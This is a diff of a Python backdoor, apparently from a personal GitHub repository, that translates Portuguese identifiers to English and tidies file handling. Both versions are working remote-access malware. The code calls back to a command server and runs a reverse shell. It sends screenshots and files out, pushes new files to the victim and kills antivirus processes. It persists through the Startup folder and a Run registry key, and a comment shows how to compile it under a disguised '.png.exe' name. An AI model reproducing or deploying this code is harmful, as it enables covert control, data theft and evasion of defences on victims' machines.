@@ -4,13 +4,8 @@
 # github.com/tarcisio-marinho
 
 
-import socket
-import os
-import time
-import subprocess
-import tempfile
-import random
-import threading
+import socket, os, time, subprocess, tempfile, random, threading
+
 if(os.name == 'posix'): # try import propely screenshot module
     try:
         import pyscreenshot
@@ -23,8 +18,8 @@ elif(os.name == 'nt'):
         pass
 
 
-nome_arquivo='backdoor.exe' # name of file after compiled
-TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
+filename='backdoor.exe' 
+tempdir = tempfile.gettempdir()
 
 ''' COMPILAR O BACKDOOR
  pyinstaller -F --clean -w backdoor.py -i icone.png -n backdoor.png.exe
@@ -63,122 +58,122 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
     criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
 '''
 
-# funcão que vai ser executada por uma thread
-def run(comando):
-    comando = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def run(command):
+    command = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return command.stdout.readlines()
 
-# método que executa um programa em uma nova thread
-def run_program(s , nome_programa):
-    if(os.path.isfile(nome_programa)):
-        sistema = os.name
-        if(sistema == 'nt'):
+
+def run_program(s , program_name):
+    if(os.path.isfile(program_name)):
+        sys = os.name
+        if(sys == 'nt'):
             execute = 'start'
-            if('.exe' in nome_programa): # apenas executa o programa
-                comando = nome_programa
+            if('.exe' in program_name): # apenas executa o programa
+                command = program_name
             else:
-                comando = execute + ' ' + nome_programa
+                command = execute + ' ' + program_name
 
-        elif(sistema == 'posix'):
+        elif(sys == 'posix'):
             execute = './'
-            comando = execute + nome_programa
+            command = execute + program_name
 
-        if('.py' in nome_programa):
+        if('.py' in program_name):
             execute = 'python '
-            comando = execute + nome_programa
+            command = execute + program_name
 
-        t = threading.Thread(target=run, args = (comando,), name='run')
-        t.start()
+        thread = threading.Thread(target=run, args = (command,), name='run')
+        thread.start()
         s.send('0')
     else: # arquivo não existe
         s.send('1')
 
-# metodo que tira screenshot do PC da vitma
+
 def screenshot(s):
-    nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
+    name = tempdir + '/screenshot'+str(random.randint(0,1000000)) + '.png'
     if(os.name == 'posix'): # se for unix-like
         img = pyscreenshot.grab()
-        img.save(nome)
+        img.save(name)
     elif(os.name == 'nt'): # se for windows
         img = ImageGrab.grab()
-        img.save(nome)
+        img.save(name)
 
-    # envia para o servidor
-    f = open(nome ,'rb')
-    l = f.read(1024)
-    l = nome + '+/-' + l
-    while(l):
-        s.send(l)
+    with open(name ,'rb') as f: 
         l = f.read(1024)
-    f.close()
-    print('enviado')
-    s.shutdown(socket.SHUT_WR)
-    os.remove(nome)
+        l = name + '+/-' + l
+        while(l):
+            s.send(l)
+            l = f.read(1024)
 
-# recebe arquivos do servidor e salva no PC da vitma
+    print('sent')
+    s.shutdown(socket.SHUT_WR)
+    os.remove(name)
+
+
 def upload(s):
     l = s.recv(1024)
-    nome_arquivo = l.split('+/-')[0]
-    print(nome_arquivo)
-    f = open(nome_arquivo,'wb')
-    l = l.split('+/-')[1]
-    j = s.recv(1024)
-    l = l + j
-    while (l):
-        f.write(l)
-        l = s.recv(1024)
-    f.close()
+    filename = l.split('+/-')[0]
+    print(filename)
 
- # shell reversa
+    with open(filename,'wb') as f: 
+        l = l.split('+/-')[1]
+        j = s.recv(1024)
+        l = l + j
+        while (l):
+            f.write(l)
+            l = s.recv(1024)
+
+
 def shell(s):
     while True:
-        dados = s.recv(1024)
-        if(not dados or dados=='exit'):
+        data = s.recv(1024)
+        if(not data or data=='exit'):
             break
-        if(dados == 'shell'):
+        if(data == 'shell'):
             pass
         else:
-            if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
+            if(data.split(' ')[0] == 'cd'): # trocar de diretorio
                 try:
-                    pasta = (dados.split(' ')[1])
-                    if(os.path.isdir(pasta)):
-                        caminho = os.chdir(pasta.rstrip('\n'))
+                    directory = (data.split(' ')[1])
+                    if(os.path.isdir(directory)):
+                        path = os.chdir(directory.rstrip('\n'))
                         local = os.getcwd()
                         s.send(local)
                     else:
                         s.send('caminho não existe\n'+ os.getcwd())
                 except Exception as e:
                     s.send('Error -> '+ e)
-            else: # executa o comando
-                comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-                retorno = comando.stdout.read() + comando.stderr.read()
-                if(retorno == ''):
-                    s.send('feito')
+            else: 
+                command = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                ret = command.stdout.read() + command.stderr.read()
+                if(ret == ''):
+                    s.send('done')
                 else:
-                    s.send(retorno)
-# servidor baixa um arquivo do PC da vitma
+                    s.send(ret)
+
+
 def download(s):
-    arquivo = s.recv(1024)
-    print(arquivo)
-    if(os.path.isfile(arquivo)):
-        f = open(arquivo, 'rb')
-        l = f.read(1024)
-        l = 'True+/-' + l
-        while(l):
-            s.send(l)
+    filename = s.recv(1024)
+    print(filename)
+    if(os.path.isfile(filename)):
+        with open(filename, 'rb') as f: 
             l = f.read(1024)
-        f.close()
-        print('envio completo')
+            l = 'True+/-' + l
+            while(l):
+                s.send(l)
+                l = f.read(1024)
+
+        print('sent')
         s.shutdown(s.SHUT_WR)
 
     else:
         s.send('False')
 
-# finaliza o processo do antivirus rodando na maquina
+
 def kill_antivirus():
     with open('av.txt') as f:
         avs = f.read()
         avs = avs.split('\n')
-    processes=get_output('TASKLIST /FI "STATUS eq RUNNING"')
+    processes = run('TASKLIST /FI "STATUS eq RUNNING"')
     ps = []
     for i in processes.split(' '):
         if (".exe" in i):
@@ -188,58 +183,59 @@ def kill_antivirus():
             if(p == av):
                 subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
-# persistencia -> mesmo depois de reiniciar o virus continua rodando
-def persistencia(sistema):
-    if(sistema == 'nt'):
-        usuario = os.path.expanduser('~')
-        diretorio = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
-        caminho = usuario + diretorio
-        if(os.path.isdir(caminho)): # copia o backdoor para diretorio startup
-            subprocess.Popen('copy ' + nome_arquivo + ' ' + caminho, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
 
-        if(not os.getcwd() == TEMPDIR): # salva backdoor no registro
-            subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+def persistence(sys):
+    if(sys == 'nt'):
+        user = os.path.expanduser('~')
+        directory = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        path = os.path.join(user, directory)
+
+        if(os.path.isdir(path)): # copia o backdoor para diretorio startup
+            subprocess.Popen('copy ' + filename + ' ' + path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+
+        if(not os.getcwd() == tempdir): # salva backdoor no registro
+            subprocess.Popen('copy ' + filename + ' ' + tempdir, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
             FNULL = open(os.devnull,'w')
-            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, stderr=FNULL)
+            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + tempdir + "\\" + filename, stdout=FNULL, stderr=FNULL)
 
-    elif(sistema == 'posix'):
+    elif(sys == 'posix'):
         pass
 
-def conecta(IP, PORT):
+def conecta(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((IP, PORT))
+        s.connect((ip, port))
         s.send('[+] Conectado :)')
         return s
     except socket.error as erro:
         return None
 
-def executa(socket):
+def execute(socket):
     while True:
         try:
-            dados = socket.recv(1)
-            if(not dados): # servidor desconectou, recomeça
+            data = socket.recv(1)
+            if(not data): # servidor desconectou, recomeça
                 return
             else:
                 try:
-                    if(dados=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
+                    if(data=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
                         upload(socket)
-                    elif(dados=='2'): # shell reversa -> servidor se conecta a maquina do infectado
+                    elif(data=='2'): # shell reversa -> servidor se conecta a maquina do infectado
                         shell(socket)
-                    elif(dados=='3'): # Download
+                    elif(data=='3'): # Download
                         download(socket)
-                    elif(dados == '4'): # Killav
+                    elif(data == '4'): # Killav
                         kill_antivirus()
-                    elif(dados == '5'): # screenshot
+                    elif(data == '5'): # screenshot
                         screenshot(socket)
-                    elif(dados == '6'):
+                    elif(data == '6'):
                         programa = socket.recv(1024)
                         print(programa)
                         run_program(socket, programa)
-                    elif(dados == '7'):
+                    elif(data == '7'):
                         geolocation(socket)
                     else:
-                        print(dados)
+                        print(data)
 
                 except:
                     return
@@ -247,18 +243,18 @@ def executa(socket):
             return
 
 def main():
-    ip='127.0.0.1'
-    porta=1025
-    while True:
-        conexao = conecta(ip, porta)
-        if(conexao):
-            executa(conexao)
+    ip = '127.0.0.1'
+    port = 1025
+    while (True):
+        connection = conecta(ip, port)
+        if(connection):
+            execute(connection)
         else:
             time.sleep(5)
 
 if __name__=='__main__':
     if(os.name == 'nt'):
-        persistencia('nt')
+        persistence('nt')
     elif(os.name == 'posix'):
-        persistencia('posix')
+        persistence('posix')
     main()
